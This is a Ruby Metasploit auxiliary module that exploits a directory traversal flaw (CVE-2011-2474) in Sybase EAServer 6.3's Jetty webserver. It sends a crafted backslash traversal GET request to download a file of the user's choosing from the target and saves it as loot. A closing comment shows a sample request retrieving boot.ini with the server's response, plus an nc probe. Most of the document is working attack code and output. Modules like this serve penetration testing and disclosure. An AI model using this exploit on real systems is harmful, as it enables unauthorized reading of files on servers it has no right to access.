##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Sybase Easerver 6.3 Directory Traversal',
      'Description'    => %q{
          This module exploits a directory traversal vulnerability found in Sybase
        EAserver's Jetty webserver on port 8000. Code execution seems unlikely with
        EAserver's default configuration unless the web server allows WRITE permission.
      },
      'References'     =>
        [
          [ 'CVE', '2011-2474' ],
          [ 'OSVDB', '72498' ],
          [ 'URL', 'http://www.sybase.com/detail?id=1093216' ],
          [ 'URL', 'https://labs.idefense.com/verisign/intelligence/2009/vulnerabilities/display.php?id=912' ],
        ],
      'Author'         =>
        [
          'Sow Ching Shiong', #Initial discovery (via iDefense)
          'sinn3r'
        ],
      'License'        => MSF_LICENSE,
      'DisclosureDate' => "May 25 2011"
    ))

    register_options(
      [
        Opt::RPORT(8000),
        OptString.new("FILEPATH", [false, 'Specify a parameter for the action'])
      ], self.class)

    deregister_options('RHOST')
  end

  def run_host(ip)
    # No point to continue if no filename is specified
    if datastore['FILEPATH'].nil? or datastore['FILEPATH'].empty?
      print_error("Please supply the name of the file you want to download")
      return
    end

    print_status("Attempting to download: #{datastore['FILEPATH']}")

    # Create request
    traversal = ".\\..\\.\\..\\.\\..\\.\\.."
    res = send_request_raw({
      'method' => 'GET',
      'uri'    => "/#{traversal}\\#{datastore['FILEPATH']}"
    }, 25)

    print_status("Server returns HTTP code: #{res.code.to_s}")

    # Show data if needed
    if res and res.code == 200
      vprint_line(res.to_s)
      fname = File.basename(datastore['FILEPATH'])

      path = store_loot(
        'easerver.http',
        'application/octet-stream',
        ip,
        res.body,
        fname
      )
      print_status("File saved in: #{path}")
    else
      print_error("Nothing was downloaded")
    end
  end
end

=begin
GET /.\..\.\..\.\..\.\..\boot.ini HTTP/1.0
User-Agent: DotDotPwn v2.1  <-- yup, awesome tool
Connection: close
Accept: */*
Host: 10.0.1.55:8000

HTTP/1.1 200 OK
Last-Modified: Sat, 24 Sep 2011 07:12:39 GMT
Content-Length: 211
Connection: close
Server: Jetty(EAServer/6.3.1.04 Build 63104 EBF 18509)

[boot loader]
timeout=30
default=multi(0)disk(0)rdisk(0)partition(1)\WINDOWS
[operating systems]
multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /NoExecute=OptIn

$ nc 10.0.1.55 8000
OPTIONS / HTTP/1.0

HTTP/1.1 405 Method Not Allowed
Allow: GET
Content-Length: 0
Server: Jetty(EAServer/6.3.1.04 Build 63104 EBF 18509)
=end
